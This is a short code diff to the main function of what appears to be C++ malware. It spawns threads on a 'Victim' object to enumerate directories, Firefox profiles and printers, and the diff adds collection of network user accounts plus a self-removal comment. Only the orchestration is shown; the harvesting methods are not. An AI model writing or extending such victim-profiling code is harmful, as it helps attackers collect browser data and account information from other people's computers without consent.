@@ -28,6 +28,9 @@ int main(int argc, char* argv[]) {
 	t_DirectoriesEnum.join();
 	CurrentComputer->GetFirefoxProfiles();
 	std::thread t_EnumeratePrintersInformation(&Victim::EnumeratePrintersInformation, CurrentComputer);
+	std::thread t_NetUsers(&Victim::GetNetUsers, CurrentComputer);
 	//t_GetFirefoxProfiles.join();
 	t_EnumeratePrintersInformation.join();
+	t_NetUsers.join();
+	delete CurrentComputer; //Delete our HeapAllocated Victim and remove our program.
 }
